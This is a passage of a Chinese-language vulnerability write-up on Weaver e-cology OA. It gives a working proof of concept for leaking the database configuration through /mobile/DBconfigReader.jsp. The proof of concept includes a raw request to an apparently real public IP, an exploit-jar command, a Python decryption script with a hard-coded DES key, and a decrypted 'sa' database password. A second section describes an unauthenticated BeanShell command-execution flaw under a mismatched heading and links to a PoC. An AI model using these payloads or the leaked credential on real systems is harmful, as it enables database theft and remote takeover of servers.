泛微ecology OA系统某接口存在数据库配置信息泄露漏洞

漏洞位置:

/mobile/DBconfigReader.jsp

漏洞详情:

当返回包返回数据带有\n之类的符号时会导致解密失败

版本

泛微e-cology <= 9.0

请求方式:

GET

POC:

发送数据包

GET /mobile/DBconfigReader.jsp HTTP/1.1Host: 47.92.97.60:8090User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1

返回数据包

HTTP/1.1 200 OKServer: Resin/3.1.8Cache-Control: privateX-Frame-Options: SAMEORIGINX-XSS-Protection: 1X-UA-Compatible: IE=8Set-Cookie: ecology_JSessionId=abcniWko2aktQ4_Ox_g4w; path=/Content-Type: text/html; charset=UTF-8Connection: closeDate: Sat, 26 Oct 2019 07:30:43 GMTContent-Length: 106

第一种方法jar解密数据包

使用ecologyExp.jar对网站数据进行解密

java -jar ecologyExp.jar http://47.92.97.60

最终结果

url=jdbc:sqlserver://127.0.0.1:1433;DatabaseName=ecology,user=sa,password=BIMbim123,logintype=1572104424163

第二种方法python解密数据包

import pyDesimport requests

key='1z2x3c4v5b6n'[0:8]d=requests.get("http://47.92.97.60/mobile/DBconfigReader.jsp").content[10:]k=pyDes.des(key,pyDes.ECB,'\0'*8,pad=None, padmode=pyDes.PAD_PKCS5)print(k.decrypt(d))

0x03 

泛微OA WorkflowCenterTreeData接口注入漏洞

漏洞位置:

/weaver/bsh.servlet.BshServlet/

漏洞详情:

2019年9月19日，泛微e-cology OA系统被爆出存在远程代码执行漏洞。该漏洞存在于泛微协同管理应用平台OA系统的BeanShell组件中，该组件为系统自带且允许未授权访问。攻击者通过调用BeanShell组件的问题接口可直接在目标服务器上执行任意命令，目前该漏洞安全补丁已发布，请使用泛微e-cology OA系统的用户尽快采取防护措施。

版本

泛微e-cology<=10.0

请求方式:

POST

POC利用传送门：https://github.com/sunird/e-cology-poc
